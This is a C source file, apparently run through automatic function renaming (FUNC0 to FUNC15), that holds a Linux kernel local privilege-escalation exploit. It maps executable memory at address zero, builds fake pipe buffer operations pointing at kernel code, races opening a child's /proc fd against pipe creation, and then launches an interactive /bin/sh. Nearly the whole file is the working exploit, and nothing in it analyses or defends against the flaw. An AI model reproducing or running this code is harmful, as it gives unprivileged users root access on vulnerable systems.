#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct pseudo_pipe_inode_info {TYPE_1__* bufs; scalar_t__ writers; scalar_t__ readers; } ;
struct pipe_buf_operations {int** ops; } ;
struct TYPE_2__ {struct pipe_buf_operations* ops; } ;

/* Variables and functions */
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_PRIVATE ; 
 int /*<<< orphan*/  O_RDWR ; 
 int PIPE_BUFFERS ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,char*,int /*<<< orphan*/ *) ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 () ; 
 int /*<<< orphan*/  gid ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 scalar_t__ kernel_code ; 
 char* FUNC7 (int /*<<< orphan*/ ,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC8 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int FUNC10 (int*) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 int /*<<< orphan*/  uid ; 

int FUNC15(int ac, char **av)
{
	int fd[2];
	int pid;
	int parent_pid = FUNC4();
	char *buf;
	int i,j;
	struct pseudo_pipe_inode_info 	*pinfo = 0;
	struct pipe_buf_operations	ops;	

	buf = FUNC7(0, 0x1000, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 0, 0); 

	FUNC11 ("buf: %p\n", buf);

	pinfo->readers = 0;
	pinfo->writers = 0;

	for (i = 0; i < 10; i++)
		ops.ops[i] = (int *)kernel_code;

	for (i = 0; i < PIPE_BUFFERS; i++)
	{
		pinfo->bufs[i].ops = &ops;
	}

	i = 0;


	uid = FUNC5();
	gid = FUNC3();
	FUNC13(uid, uid, uid);
	FUNC12(gid, gid, gid);
	//while (1) 
	{
		pid = FUNC2();
		if (pid == -1)
		{
			FUNC9("fork");
			return (-1);
		}
		if (pid)
		{
			char path[1024];
			char c;
			/* I assume next opened fd will be 4 */
			FUNC14(path, "/proc/%d/fd/4", pid);
		        FUNC11("Parent: %d\nChild: %d\n", parent_pid, pid);	
			while (!FUNC6(0))
			{
				fd[0] = FUNC8(path, O_RDWR);
				if (fd[0] != -1)
				{
					FUNC0(fd[0]);
				}
			}
			//system("/bin/sh");
			FUNC1("/bin/sh", "/bin/sh", "-i", NULL);
			return (0);
		}
	
		while (!FUNC6(0))
		{
			if (FUNC10(fd) != -1)
			{
				FUNC0(fd[0]);
				FUNC0(fd[1]);
			}
		}
	}
}